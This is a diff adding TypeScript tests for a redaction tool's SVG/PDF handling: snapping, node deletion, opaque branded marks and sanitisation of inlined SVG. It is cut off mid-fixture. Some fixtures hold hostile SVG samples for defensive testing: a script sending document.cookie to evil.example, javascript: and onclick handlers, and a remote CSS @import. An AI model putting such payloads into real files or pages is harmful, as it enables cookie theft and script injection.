+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  const nodes = [{ idx: 3, x: 10, y: 20, w: 40, h: 30 }];
+
+  const out = resnap.plan(
+    [{ page: 1, x: 12, y: 32, w: 20, h: 4, label: 'keep me', note: 7 }],
+    1, nodes, W, H, eff
+  );
+  assert.equal(out.changed, true);
+  assert.equal(out.next[0].label, 'keep me', 'unknown columns are not dropped on correction');
+  assert.equal(out.next[0].note, 7);
+  assert.equal(out.next[0].page, 1);
+});
+
+test('redact resnap: a chain longer than the snap pass cap still settles in ONE correction', () => {
+  const resnap = loadTemplateResnap();
+  const W = 4000, H = 150;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  // snapBarToNodes stops after a bounded number of growth passes. A row of 40
+  // touching glyph boxes is longer than that, so a single call comes back still
+  // touching what it has not swallowed — and the bar would then creep outward
+  // one commit per render, which the user watches happen.
+  const nodes = Array.from({ length: 40 }, (_, i) => ({ idx: i, x: 10 + i * 20, y: 20, w: 20, h: 30 }));
+
+  const first = resnap.plan([{ page: 1, x: 12, y: 32, w: 10, h: 4 }], 1, nodes, W, H, eff);
+  assert.equal(first.changed, true);
+  const second = resnap.plan(first.next, 1, nodes, W, H, eff);
+  assert.equal(second.changed, false, 'settled in one pass — no creep across renders');
+  // And it really did swallow the whole chain rather than stopping part way.
+  assert.ok(first.next[0].x + first.next[0].w >= 10 + 39 * 20 + 20,
+    'grew across the entire chain, not just the first few passes');
+});
+
+test('redact resnap: one array threaded through several pages keeps every correction', () => {
+  const resnap = loadTemplateResnap();
+  const W = 300, H = 150;
+  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
+  const nodesP1 = [{ idx: 0, x: 10, y: 20, w: 40, h: 30 }];
+  const nodesP2 = [{ idx: 7, x: 60, y: 40, w: 40, h: 30 }];
+
+  // Every page frame measures its own page, but they all share ONE bars array.
+  // The canvas folds them together before committing once; a per-frame commit
+  // would rebuild the array from the same pre-correction snapshot and hand back
+  // page 1's uncorrected row, reverting it. This pins the folding.
+  const bars = [
+    { page: 1, x: 12, y: 32, w: 8, h: 4 },
+    { page: 2, x: 62, y: 52, w: 8, h: 4 },
+  ];
+  const afterP1 = resnap.plan(bars, 1, nodesP1, W, H, eff);
+  assert.equal(afterP1.changed, true);
+  const afterP2 = resnap.plan(afterP1.next, 2, nodesP2, W, H, eff);
+  assert.equal(afterP2.changed, true);
+
+  // Both rows are measured in the SAME array — page 1's correction survived
+  // page 2's pass.
+  assert.equal(resnap.measured(afterP2.next[0]), true, 'page 1 stayed corrected');
+  assert.equal(resnap.measured(afterP2.next[1]), true, 'page 2 was corrected too');
+  assert.ok(afterP2.next[0].w >= 40, 'page 1 kept its snapped geometry');
+
+  // And the folded result is a fixed point for both pages.
+  assert.equal(resnap.plan(afterP2.next, 1, nodesP1, W, H, eff).changed, false);
+  assert.equal(resnap.plan(afterP2.next, 2, nodesP2, W, H, eff).changed, false);
+});
+
+test('redact resnap: "measured" reads a mark the same way the hook parses one', () => {
+  const resnap = loadTemplateResnap();
+  const { parseNodeMarks } = loadGeom();
+  // The two have to agree on the one distinction vector export turns on:
+  // an absence of information is not a fact about the document.
+  for (const n of ['m', 'm:0', 'm:3,17', '', 'nonsense', undefined, null]) {
+    assert.equal(
+      resnap.measured({ n }),
+      parseNodeMarks(n) !== null,
+      `measured(${JSON.stringify(n)}) agrees with the hook`
+    );
+  }
+});
+
+// ─── node addressing: the string a drawn bar carries ─────────────────────────
+
+test('redact: the per-bar node marks distinguish "measured, nothing there" from "never measured"', () => {
+  const { parseNodeMarks, formatNodeMarks } = loadGeom();
+  // The difference is the whole honesty of vector mode: one is a fact about the
+  // document, the other is an absence of information.
+  assert.equal(parseNodeMarks(''), null, 'never measured');
+  assert.equal(parseNodeMarks(undefined), null);
+  assert.equal(parseNodeMarks('nonsense'), null);
+  assert.deepEqual(parseNodeMarks('m'), [], 'measured, nothing under the bar');
+  assert.deepEqual(parseNodeMarks('m:3,17'), [3, 17]);
+  assert.equal(formatNodeMarks([]), 'm');
+  assert.equal(formatNodeMarks([17, 3]), 'm:17,3');
+  assert.deepEqual(parseNodeMarks(formatNodeMarks([4, 9])), [4, 9], 'round trip');
+});
+
+// ─── inline SVG preparation (the enabling change) ────────────────────────────
+
+test('redact: prepareInlineSvg addresses every element and neutralises the executable subset', () => {
+  const { prepareInlineSvg } = loadGeom();
+  const src = `<?xml version="1.0"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<!-- authored in a hurry -->
+<svg xmlns="http://www.w3.org/2000/svg" width="210mm" height="105mm" viewBox="0 0 100 50">
+  <script>fetch('https://evil.example/' + document.cookie)</script>
+  <foreignObject width="10" height="10"><div onclick="steal()">html</div></foreignObject>
+  <a href="javascript:steal()" onclick="steal()"><text x="5" y="20">Keep me</text></a>
+  <image href="data:image/png;base64,AAAA" width="10" height="10"/>
+</svg>`;
+  const out = prepareInlineSvg(src, { className: 'rd-img', natW: 793.7, natH: 396.85 });
+
+  // Code cannot ride into the app's origin on an inline fragment.
+  assert.doesNotMatch(out, /<script|evil\.example|document\.cookie/);
+  assert.doesNotMatch(out, /foreignObject|steal\(\)/i);
+  assert.doesNotMatch(out, /onclick|javascript:/i);
+  // A prologue has no meaning inline, and comments are noise.
+  assert.doesNotMatch(out, /<\?xml|<!DOCTYPE|<!--/);
+  // The artwork survives, including the data-URI image the preview needs to
+  // render (it is a picture, not code; vector EXPORT is where it gets deleted).
+  assert.match(out, /Keep me/);
+  assert.match(out, /data:image\/png/);
+  // Sized at the natural pixels the bars are measured in; the viewBox is left
+  // exactly alone, so the export's own mapping still agrees with the preview.
+  assert.match(out, /width="793\.7" height="396\.85"/);
+  assert.match(out, /viewBox="0 0 100 50"/);
+  assert.doesNotMatch(out, /210mm/);
+  assert.match(out, /class="rd-img"/);
+  // Every element but the root carries its token address.
+  assert.match(out, /<text[^>]*data-rdn="\d+"/);
+  assert.match(out, /<image[^>]*data-rdn="\d+"/);
+  assert.doesNotMatch(out, /<svg[^>]*data-rdn=/, 'the root is never a deletion target');
+
+  assert.equal(prepareInlineSvg('not markup at all', { natW: 10, natH: 10 }), '',
+    'markup with no <svg> root inlines nothing, and the <img> fallback takes over');
+});
+
+test("redact: an inlined file's own CSS is rescoped so it cannot repaint the app", () => {
+  const { prepareInlineSvg, scopeCssRules } = loadGeom();
+  // A <style> inside inline SVG is DOCUMENT-wide in HTML. Illustrator and Figma
+  // exports ship `.cls-1 { … }` constantly, so dropping the block would make
+  // half the previews render as black shapes; rescoping keeps the picture and
+  // contains the blast radius.
+  const src = '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="50" viewBox="0 0 100 50">'
+    + '<style>@import url(https://evil.example/x.css); .cls-1, text { fill: #fff } '
+    + '@media (min-width: 1px) { .cls-2 { fill: red } } '
+    + '@font-face { font-family: X; src: url(data:font/woff2;base64,AA) }</style>'
+    + '<text class="cls-1" x="5" y="20">Hi</text></svg>';
+  const out = prepareInlineSvg(src, { natW: 100, natH: 50 });
+  assert.match(out, /svg\[data-rdsvg\] \.cls-1,svg\[data-rdsvg\] text\{/);
+  assert.match(out, /@media \(min-width: 1px\) \{svg\[data-rdsvg\] \.cls-2\{/, 'nested at-rules are scoped too');
+  assert.doesNotMatch(out, /@import/, 'an @import would fetch from inside the app');
+  assert.match(out, /@font-face/, 'font faces are not selectors and stay as they are');
+
+  // Bare, so the rule is pinned without the surrounding markup in the way.
+  assert.equal(scopeCssRules('a{x:1}', 'S', 0), 'S a{x:1}');
+  assert.equal(scopeCssRules('a , b{x:1}', 'S', 0), 'S a,S b{x:1}');
+});
+
+// ─── vector deletion: bars REMOVE what they touch, and the gate proves it ────
+
+const NODES_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
+  <text x="10" y="30">HUSHWORD</text>
+  <text x="10" y="70">Public line</text>
+  <rect x="150" y="10" width="30" height="20" fill="#ccc"/>
+</svg>`;
+
+// Read a node's committed address the way the canvas does: off the inline
+// markup the template renders, which is the same token index the export deletes
+// by. That round trip IS the addressing scheme, so the test walks it.
+function rdnOfText(markup: string, contains: string): number {
+  const re = /<text[^>]*\bdata-rdn="(\d+)"[^>]*>([\s\S]*?)<\/text>/g;
+  let m: RegExpExecArray | null;
+  while ((m = re.exec(markup))) {
+    if (m[2]!.includes(contains)) return Number(m[1]);
+  }
+  throw new Error(`no <text> containing ${contains}`);
+}
+
+test('redact: vector export DELETES the addressed nodes, not just covers them', async () => {
+  const hooks = loadHooks();
+  const { prepareInlineSvg } = loadGeom();
+  const inline = prepareInlineSvg(NODES_SVG, { natW: 200, natH: 100 });
+  const hushIdx = rdnOfText(inline, 'HUSHWORD');
+
+  const res = await hooks.exportFile({
+    model: modelFor(fileRef('n.svg', 'image/svg+xml', svgBytes(NODES_SVG)), {
+      svgVector: true,
+      bars: [drawn(8, 14, 90, 22, { n: `m:${hushIdx}` })],
+    }),
+    host: BARE_HOST,
+  });
+  const out = new TextDecoder().decode(res.bytes);
+  // Gone from the file, not painted over: this is the claim the round supersedes
+  // the old "vector mode covers positioned text" caveat with.
+  assert.doesNotMatch(out, /HUSHWORD/);
+  // Everything the bar did not touch is untouched.
+  assert.match(out, /Public line/);
+  assert.match(out, /<rect x="150"/);
+  // And the opaque mark is still painted over the area (the branded default: a
+  // rounded path in the resolved ink, fully opaque).
+  assert.match(out, /<path d="M[^"]+" fill="#14161a" fill-opacity="1"\/>/);
+});
+
+test('redact: a bar with no measured nodes deletes nothing and still paints', async () => {
+  const hooks = loadHooks();
+  const res = await hooks.exportFile({
+    model: modelFor(fileRef('n.svg', 'image/svg+xml', svgBytes(NODES_SVG)), {
+      svgVector: true,
+      bars: [drawn(150, 10, 30, 20)], // 'm' — measured, nothing under it
+    }),
+    host: BARE_HOST,
+  });
+  const out = new TextDecoder().decode(res.bytes);
+  assert.match(out, /HUSHWORD/, 'a bar that touched nothing removes nothing');
+  assert.match(out, /fill="#14161a" fill-opacity="1"/);
+});
+
+test('redact: vector export refuses a bar that was never measured, instead of covering it', async () => {
+  const hooks = loadHooks();
+  // A bar typed into the sidebar, restored from a URL, or driven headlessly has
+  // no idea what it sits on. Covering what we promised to delete would be the
+  // one dishonest export in the tool, so it fails with a sentence that says
+  // what to do instead.
+  await assert.rejects(
+    () => hooks.exportFile({
+      model: modelFor(fileRef('n.svg', 'image/svg+xml', svgBytes(NODES_SVG)), {
+        svgVector: true,
+        bars: [{ page: 1, x: 8, y: 14, w: 90, h: 22 }],
+      }),
+      host: BARE_HOST,
+    }),
+    (e: any) => {
+      assert.match(e.message, /has to be measured against the page/);
+      assert.match(e.message, /turn vector mode off to export a PNG instead\.$/);
+      // The wording is a contract with the CLI, not just prose: it is how a
+      // headless run learns this is browser work and escalates to the browser
+      // tier instead of failing, where the canvas measures the bars for real.
+      assert.equal(needsBrowserTier(e.message), true,
+        'the refusal must classify as browser-tier work — see shells/cli/src/run.ts');
+      return true;
+    }
+  );
+});
+
+test('redact: the gate fails when a deleted node\'s content survives elsewhere in the output', async () => {
+  const hooks = loadHooks();
+  const { prepareInlineSvg } = loadGeom();
+  // The same word sits in a node the bar touched AND in one it did not. The
+  // deletion is real, but the STRING is still recoverable from the file, and
+  // the export gate greps for exactly that rather than trusting the surgery.
+  const twice = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
+  <text x="10" y="30">HUSHWORD</text>
+  <text x="10" y="90">HUSHWORD again, far away</text>
+</svg>`;
+  const idx = rdnOfText(prepareInlineSvg(twice, { natW: 200, natH: 100 }), 'HUSHWORD');
+  await assert.rejects(
+    () => hooks.exportFile({
+      model: modelFor(fileRef('t.svg', 'image/svg+xml', svgBytes(twice)), {
+        svgVector: true,
+        bars: [drawn(8, 14, 90, 22, { n: `m:${idx}` })],
+      }),
+      host: BARE_HOST,
+    }),
+    /Verification failed: removed content is still present in the SVG output\. Nothing was downloaded\./
+  );
+});
+
+test('redact: the root <svg> can never be addressed for deletion', () => {
+  const { cleanSvgTokens, tokenize } = loadGeom();
+  // Index 0 of a document that opens with the root tag. A hostile or buggy
+  // commit naming it must not empty the file.
+  const src = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><text>hi there</text></svg>';
+  const removed: string[] = [];
+  const out = cleanSvgTokens(tokenize(src), removed, new Set([0]));
+  assert.match(out, /^<svg/);
+  assert.match(out, /hi there/);
+});
+
+// ─── the SVG source renders inline, end to end ───────────────────────────────
+
+test('redact (e2e): an SVG source renders as inline markup, not an <img>', async () => {
+  const rt = await createRuntime(redactTool(), BARE_HOST, {
+    source: fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)),
+  });
+  const html = rt.getHydrated();
+  // The frame declares its bar space, and the page itself is in the DOM where
+  // node bounds can be read.
+  assert.match(html, /class="rd-frame" data-page="1" data-ptw="200" data-pth="100"/);
+  assert.match(html, /<svg[^>]*class="rd-img"[^>]*data-rdsvg=""/);
+  assert.match(html, /<text[^>]*data-rdn="\d+"[^>]*>Visible caption<\/text>/);
+  // The preview is sanitised on the way in: the fixture's script never reaches
+  // the app's DOM even though the export path is what deletes it from the file.
+  assert.doesNotMatch(html, /espionage/);
+  // No <img> preview for an SVG any more.
+  assert.doesNotMatch(html, /<img class="rd-img"/);
+});
+
+test('redact (e2e): a raster source keeps the <img> preview and says why it cannot snap', async () => {
+  const rt = await createRuntime(redactTool(), BARE_HOST, {
+    source: fileRef('shot.png', 'image/png', buildDirtyPng()),
+  });
+  const html = rt.getHydrated();
+  assert.match(html, /<img class="rd-img"/, 'flat pixels stay an <img>');
+  assert.doesNotMatch(html, /data-rdsvg/);
+  // Honest about the consequence rather than silently offering nothing.
+  assert.match(html, /no elements to measure/);
+  assert.match(html, /covers exactly the area you draw/);
+});
+
+// ─── the branded mark: brand tone in, opaque fill out ────────────────────────
+// A redaction is an act of authorship and its look is a trust surface, so the
+// mark inherits the loaded brand the way community tools inherit palettes
+// everywhere else. What must never move: the fill is 100% opaque, and the shape
+// covers everything the user marked.
+
+/** A host whose tokens.colors() answers with the given swatch list. */
+function tokenHost(swatches: any[]): any {
+  return { ...BARE_HOST, tokens: { colors: async () => swatches } };
+}
+
+const SEMANTIC = (path: string, value: string): any => ({ ref: `{${path}}`, path, value, name: path });
+
+test('redact mark: the brand\'s dark tone becomes the ink, with a neutral near-black fallback', async () => {
+  const { normaliseInk, NEUTRAL_INK } = loadGeom();
+  // A fresh module per case: the resolved ink is cached per mount on purpose
+  // (one token read, not one per keystroke), so each host needs its own hooks.
+  const inkFor = async (host: any, over: any = {}) => {
+    const hooks = loadHooks();
+    const patch: any = await hooks.onInit({
+      model: modelFor(fileRef('a.png', 'image/png', buildDirtyPng()), over), host,
+    });
+    return patch.barInk;
+  };
+
+  // SUSE's own semantic text token is Pine — exactly Andy's "dark muted colour".
+  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.text', '#0C322C')])), '#0c322c');
+  // Falls back down the list, then to the neutral ink.
+  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.primary', '#123456')])), '#123456');
+  assert.equal(await inkFor(tokenHost([])), NEUTRAL_INK);
+  assert.equal(await inkFor(BARE_HOST), NEUTRAL_INK, 'no tokens API at all');
+  // A host whose tokens throw must not take the export down with it.
+  assert.equal(await inkFor({ ...BARE_HOST, tokens: { colors: async () => { throw new Error('nope'); } } }), NEUTRAL_INK);
+  // Solid is the deliberate opt-out: no brand tone, whatever is loaded.
+  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.text', '#0C322C')]), { style: 'solid' }), NEUTRAL_INK);
+  // And a token that cannot be painted honestly is refused, not approximated.
+  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.text', 'oklch(19% 0.02 275)')])), NEUTRAL_INK);
+  assert.equal(normaliseInk('oklch(19% 0.02 275)'), null);
+});
+
+test('redact mark: translucency is refused everywhere, colour is not', () => {
+  const { normaliseInk } = loadGeom();
+  // Colour is security-neutral: any fully opaque fill destroys the pixels under
+  // it equally. Alpha is NOT neutral, so nothing below full opacity may become
+  // an ink — and an unreadable value must come back null rather than be passed
+  // through, because assigning it to a canvas fillStyle is a silent no-op that
+  // would leave the previous fill (white) painting bars that redact nothing.
+  assert.equal(normaliseInk('#0C322C'), '#0c322c');
+  assert.equal(normaliseInk('  #abc '), '#aabbcc');
+  assert.equal(normaliseInk('#0c322cff'), '#0c322c', 'fully opaque 8-digit is fine');
+  assert.equal(normaliseInk('#abcf'), '#aabbcc');
+  assert.equal(normaliseInk('#0c322ccc'), null, '80% opacity is not a redaction');
+  assert.equal(normaliseInk('#0c322c00'), null);
+  assert.equal(normaliseInk('#abc8'), null);
+  assert.equal(normaliseInk('rgba(0,0,0,0.5)'), null);
+  assert.equal(normaliseInk('black'), null);
+  assert.equal(normaliseInk(''), null);
+  assert.equal(normaliseInk(null), null);
+  assert.equal(normaliseInk(42), null);
+});
+
+test('redact mark: the painted shape is INFLATED by its radius, so the marked rect is fully inside it', () => {
+  const { paintedShape } = loadGeom();
+  // The rule this pins: a rounded rectangle does NOT cover the corners of the
+  // box it is inscribed in, so rounding a bar in place would uncover four
+  // slivers of exactly what the user marked.
+  const inShape = (s: any, x: number, y: number): boolean => {
+    if (x < s.x0 || x > s.x1 || y < s.y0 || y > s.y1) return false;
+    const [tl, tr, br, bl] = s.radii;
+    const corner = (cx: number, cy: number, r: number, insideX: boolean, insideY: boolean): boolean => {
+      if (!r) return true;
+      if (insideX ? x > cx : x < cx) return true;
+      if (insideY ? y > cy : y < cy) return true;
+      return Math.hypot(x - cx, y - cy) <= r + 1e-9;
+    };
+    return corner(s.x0 + tl, s.y0 + tl, tl, true, true)
+      && corner(s.x1 - tr, s.y0 + tr, tr, false, true)
+      && corner(s.x1 - br, s.y1 - br, br, false, false)
+      && corner(s.x0 + bl, s.y1 - bl, bl, true, false);
+  };
+
+  const rects = [
+    { x0: 40, y0: 40, x1: 140, y1: 62 },   // an ordinary text-line bar
+    { x0: 0, y0: 0, x1: 30, y1: 12 },      // hard against the top-left corner
+    { x0: 270, y0: 138, x1: 300, y1: 150 },// hard against the bottom-right
+    { x0: 10, y0: 10, x1: 13, y1: 13 },    // smaller than the radius
+  ];
+  for (const rect of rects) {
+    for (const radius of [0, 1, 3, 7]) {
+      const s = paintedShape(rect, radius, 300, 150);
+      // Containment, sampled densely along the requested rect INCLUDING its
+      // corners, which is where an un-inflated rounded bar leaks.
+      for (let x = rect.x0; x <= rect.x1; x += 0.5) {
+        for (const y of [rect.y0, (rect.y0 + rect.y1) / 2, rect.y1]) {
+          assert.ok(inShape(s, x, y), `(${x},${y}) uncovered at radius ${radius} for ${JSON.stringify(rect)}`);
+        }
+      }
+      for (let y = rect.y0; y <= rect.y1; y += 0.5) {
+        for (const x of [rect.x0, rect.x1]) {
+          assert.ok(inShape(s, x, y), `(${x},${y}) uncovered at radius ${radius}`);
+        }
+      }
+      // The shape only ever GROWS, and never past the frame.
+      assert.ok(s.x0 <= rect.x0 && s.y0 <= rect.y0 && s.x1 >= rect.x1 && s.y1 >= rect.y1);
+      assert.ok(s.x0 >= 0 && s.y0 >= 0 && s.x1 <= 300 && s.y1 <= 150);
+    }
+  }
+});
+
+test('redact mark: a corner that had to clamp to the frame edge is painted square', () => {
+  const { paintedShape } = loadGeom();
+  // Clamping drags the arc centre inward, and a rounded corner there would cut
+  // back into the very rectangle the inflation exists to protect.
+  const s = paintedShape({ x0: 0, y0: 0, x1: 50, y1: 20 }, 3, 300, 150);
+  assert.deepEqual(s.radii, [0, 0, 3, 0], 'only the corner away from both edges rounds');
+  assert.equal(s.x0, 0);
+  assert.equal(s.y0, 0);
+  // Radius 0 is a plain rect with no rounding anywhere.
+  assert.deepEqual(paintedShape({ x0: 10, y0: 10, x1: 20, y1: 20 }, 0, 300, 150),
+    { x0: 10, y0: 10, x1: 20, y1: 20, radii: [0, 0, 0, 0] });
+});
+
+test('redact mark: the branded default paints the same box as solid, grown by its radius', async () => {
+  const hooks = loadHooks();
+  const bars = [drawn(20, 30, 50, 20)];
+  const out = new TextDecoder().decode((await hooks.exportFile({
+    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), { svgVector: true, bars }),
+    host: BARE_HOST,
+  })).bytes);
+  // Solid's square box is 9,28 → 81,52 (see the geometry test above). Branded
+  // adds a 3-unit radius, so the PAINTED box is 6,25 → 84,55 and the corners
+  // round back to exactly the square box's own corners.
+  const m = /<path d="(M[^"]+)" fill="#14161a" fill-opacity="1"\/>/.exec(out);
+  assert.ok(m, 'the branded mark is a rounded path');
+  assert.equal(m![1], 'M9,25H81A3,3 0 0 1 84,28V52A3,3 0 0 1 81,55H9A3,3 0 0 1 6,52V28A3,3 0 0 1 9,25Z');
+  // Never a translucent fill, in any style.
+  assert.doesNotMatch(out, /fill-opacity="(?!1")/);
+});
+
+test('redact mark: the resolved ink and shape reach the PDF rebuild as additive opts', async () => {
+  const hooks = loadHooks();
+  let seen: any = null;
+  const host = pdfHost({ pdf: { redact: async (_b: any, o: any) => { seen = o; return { bytes: PDF_OUT, pages: 2 }; } } });
+  host.tokens = { colors: async () => [SEMANTIC('color.semantic.text', '#0C322C')] };
+  await hooks.exportFile({
+    model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), {
+      bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }], style: 'stamped', stampLabel: 'Records office',
+    }),
+    host,
+  });
+  assert.ok(seen, 'host.pdf.redact was called');
+  assert.equal(seen.color, '#0c322c', 'the brand tone crosses the bridge');
+  assert.equal(seen.radius, 3);
+  assert.equal(seen.label, 'Records office');
+  assert.equal(seen.labelColor, '#ffffff', 'a light label on dark ink');
+  // The bars themselves are unchanged in shape: the bridge owns the inflation.
+  assert.deepEqual(seen.bars[0].page, 1);
+});
+
+test('redact mark: the stamp is the user\'s text, then the profile name, then the word', async () => {
+  const { stampTextFor } = loadGeom();
+  assert.equal(stampTextFor('Records office', 'Andy Fitzsimon'), 'Records office');
+  assert.equal(stampTextFor('   ', 'Andy Fitzsimon'), 'Andy Fitzsimon');
+  assert.equal(stampTextFor('', ''), 'REDACTED');
+  assert.equal(stampTextFor(null, null), 'REDACTED');
+  assert.equal(stampTextFor('x'.repeat(60), ''), 'x'.repeat(24), 'capped, never a paragraph');
+
+  // End to end: it lands on the bar, on top of the opaque fill.
+  const hooks = loadHooks();
+  const profHost = { ...BARE_HOST, profile: { get: async () => ({ firstname: 'Ada', lastname: 'Lovelace', useDetails: true }) } };
+  const out = new TextDecoder().decode((await hooks.exportFile({
+    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), {
+      svgVector: true, style: 'stamped', bars: [drawn(20, 30, 150, 20)],
+    }),
+    host: profHost,
+  })).bytes);
+  assert.match(out, /<path d="M[^"]+" fill="#14161a" fill-opacity="1"\/><text /, 'painted after (on top of) the fill');
+  assert.match(out, />Ada Lovelace<\/text>/);
+  // And nothing about it comes from the document.
+  assert.doesNotMatch(out, /hushtoken|Jane Zebra/);
+});
+
+test('redact mark: a stamp that would repeat deleted content fails with its own sentence', async () => {
+  const hooks = loadHooks();
+  // The only user-typed string this export appends is the stamp. Telling the
+  // user to change it is a far more useful failure than "this file could not be
+  // redacted" — and it still fails closed, so nothing downloads either way.
+  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">'
+    + '<!-- CONFIDENTIAL --><text x="10" y="50">Visible</text></svg>';
+  await assert.rejects(
+    () => hooks.exportFile({
+      model: modelFor(fileRef('c.svg', 'image/svg+xml', svgBytes(svg)), {
+        svgVector: true, style: 'stamped', stampLabel: 'CONFIDENTIAL', bars: [drawn(10, 55, 180, 30)],
+      }),
+      host: BARE_HOST,
+    }),
+    /the stamp text repeats content this export deleted/
+  );
+});
+
+test('redact mark: the label colour is chosen for contrast against the ink', () => {
+  const { inkContrast } = loadGeom();
+  assert.equal(inkContrast('#0c322c'), '#ffffff', 'a dark brand tone takes a light label');
+  assert.equal(inkContrast('#14161a'), '#ffffff');
+  assert.equal(inkContrast('#f2f0e8'), '#14161a', 'and a pale one takes a dark label');
+  assert.equal(inkContrast('nonsense'), '#ffffff', 'unreadable falls back with the ink itself');
+});
+
+test('redact mark: the style select only accepts the three presets', () => {
+  const { markStyleOf } = loadGeom();
+  assert.equal(markStyleOf('solid'), 'solid');
+  assert.equal(markStyleOf('branded'), 'branded');
+  assert.equal(markStyleOf('stamped'), 'stamped');
+  // Not a free style editor, and not a prototype-key hole either.
+  assert.equal(markStyleOf('constructor'), 'branded');
+  assert.equal(markStyleOf('toString'), 'branded');
+  assert.equal(markStyleOf(undefined), 'branded');
+});
+
+// ─── format-only options hide themselves ─────────────────────────────────────
+
+test('redact: the sniffed file type is published so format-only toggles can hide', async () => {
+  const hooks = loadHooks();
+  const kindOf = async (f: any): Promise<string> =>
+    (await hooks.onInit({ model: modelFor(f), host: BARE_HOST }) as any).fileKind;
+  assert.equal(await kindOf(fileRef('a.svg', 'image/svg+xml', svgBytes(DIRTY_SVG))), 'SVG');
+  assert.equal(await kindOf(fileRef('a.pdf', 'application/pdf', svgBytes('%PDF-1.4\n%%EOF\n'))), 'PDF');
+  assert.equal(await kindOf(fileRef('a.png', 'image/png', buildDirtyPng())), 'PNG');
+  assert.equal(await kindOf(null), '', 'and it clears with the file, so a stale toggle cannot linger');
+
+  // The manifest side of the same contract: the toggles are gated on it.
+  const byId = (id: string): any => MANIFEST.inputs.find((i: any) => i.id === id);
+  assert.deepEqual(byId('svgVector').showIf, { fileKind: 'SVG' });
+  assert.deepEqual(byId('resign').showIf, { fileKind: 'PDF' });
+  // And the field itself never renders: its showIf can never match its value.
+  assert.equal(byId('fileKind').showIf.fileKind, '__never-rendered');
+});
+
+// ─── fit-to-width scrolling pages ────────────────────────────────────────────
+
+/** A host whose pdf.pages answers with n identical A4-ish pages. */
+function pagesHost(n: number): any {
+  return pdfHost({
+    pdf: {
+      pages: async () => ({
+        pages: Array.from({ length: n }, (_, i) => ({ svg: pageSvg(i + 1), page: i + 1, widthPt: 612, heightPt: 792 })),
+        truncated: false,
+      }),
+    },
+  });
+}
+
+test('redact (e2e): a multi-page PDF scrolls inside the stage with a page indicator', async () => {
+  const rt = await createRuntime(redactTool(), pagesHost(3), {
+    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC),
+  });
+  const html = rt.getHydrated();
+  // The page stack lives in its OWN bounded scroller. Without it the canvas
+  // grows to the summed height of every page and the shell scales the whole
+  // document down to fit the stage — the unreadable strip this replaces.
+  assert.match(html, /<div class="rd-scroll" data-page-scroll>/);
+  assert.match(html, /class="rd-frame rd-pageframe" data-page="1"/);
+  assert.match(html, /class="rd-frame rd-pageframe" data-page="3"/);
+  // A quiet cue plus two buttons — a page frame sets touch-action:none, so a
+  // finger on the page draws a bar and cannot scroll the list.
+  assert.match(html, /<span class="rd-pagenow" data-page-now aria-live="polite">Page 1 of 3<\/span>/);
+  assert.match(html, /<button type="button" class="rd-rail-btn" data-page-step="-1"/);
+  assert.match(html, /<button type="button" class="rd-rail-btn" data-page-step="1"/);
+});
+
+test('redact (e2e): a single-page PDF gets no page navigation it does not need', async () => {
+  const rt = await createRuntime(redactTool(), pagesHost(1), {
+    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC),
+  });
+  const html = rt.getHydrated();
+  assert.match(html, /<div class="rd-scroll" data-page-scroll>/, 'the scroller is harmless on one page');
+  // Markup, not the wiring: the template script mentions both hooks by name.
+  assert.doesNotMatch(html, /<span class="rd-pagenow"/);
+  assert.doesNotMatch(html, /<button[^>]*data-page-step/);
+});
+
+// ─── authorship: what the fresh Content Credential actually records ──────────
+
+test('redact (e2e): the sidebar states who the credential names, including when it can name nobody', async () => {
+  // c2pa.sign present: without a signer the tool correctly says the credential
+  // is unavailable instead, which is a different (also tested) sentence.
+  const signer = { c2pa: { sign: async (b: any) => b } };
+  const named = { ...pagesHost(1), ...signer, profile: { get: async () => ({ firstname: 'Ada', lastname: 'Lovelace', useDetails: true }) } };
+  const rt = await createRuntime(redactTool(), named, {
+    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC), resign: true,
+  });
+  const html = rt.getHydrated();
+  assert.match(html, /signed as a new work: you \(Ada Lovelace\) as its author/);
+  assert.match(html, /No ingredients and no thumbnail of the original travel with it\./);
+
+  // "Use my details" off is the case a tool is most tempted to gloss over: the
+  // shell will record no name at all, so the copy says exactly that.
+  const anon = { ...pagesHost(1), ...signer, profile: { get: async () => ({ firstname: 'Ada', lastname: 'Lovelace' }) } };
+  const rt2 = await createRuntime(redactTool(), anon, {
+    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC), resign: true,
+  });
+  assert.match(rt2.getHydrated(), /no author name, because "Use my details" is off in your profile/);
+
+  // And nothing about authorship is claimed when the credential is off.
+  const rt3 = await createRuntime(redactTool(), named, {
+    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC),
+  });
+  assert.doesNotMatch(rt3.getHydrated(), /signed as a new work/);
+});
+
+// ─── round 4 hardening ───────────────────────────────────────────────────────
+
+test('redact: an inlined SVG cannot fetch anything from the app\'s origin', () => {
+  const { prepareInlineSvg } = loadGeom();
+  // Rounds 1-3 put the source inside <img>, where SVG-as-image blocks every
+  // external load for us. Inlining it into the live document moved that job
+  // here: a hostile file that was merely OPENED must not report home, and the
+  // empty state promises the file never leaves the device.
+  const hostile = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100">
